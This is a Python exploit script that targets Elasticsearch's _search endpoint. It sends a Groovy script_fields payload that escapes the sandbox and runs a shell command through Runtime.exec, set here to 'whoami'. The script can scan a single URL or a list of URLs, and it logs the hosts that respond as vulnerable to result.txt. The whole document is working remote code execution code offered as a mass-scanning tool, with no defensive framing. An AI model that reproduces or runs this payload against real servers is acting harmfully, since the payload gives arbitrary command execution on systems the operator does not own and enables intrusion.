#!/usr/bin/env python
#-*-coding:utf-8-*-
import requests
import json
import sys
import argparse

succlog=open('result.txt','a')

def exploit(target):
    command='whoami'
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    parameters = {
                    "size":1,
                    "script_fields":
                    {"iswin":
                            {
                                "script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).\newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.\class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\").\getInputStream())).readLines()" % command,
                                "lang": "groovy"
                            }
                    }
                }
    data = json.dumps(parameters)
    try:
        r=requests.post(target+"/_search?pretty",data=data,headers=headers,timeout=5)
        if r.status_code==200:
            succlog.write(target+"/_search?pretty\n")

    except:
        pass


if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)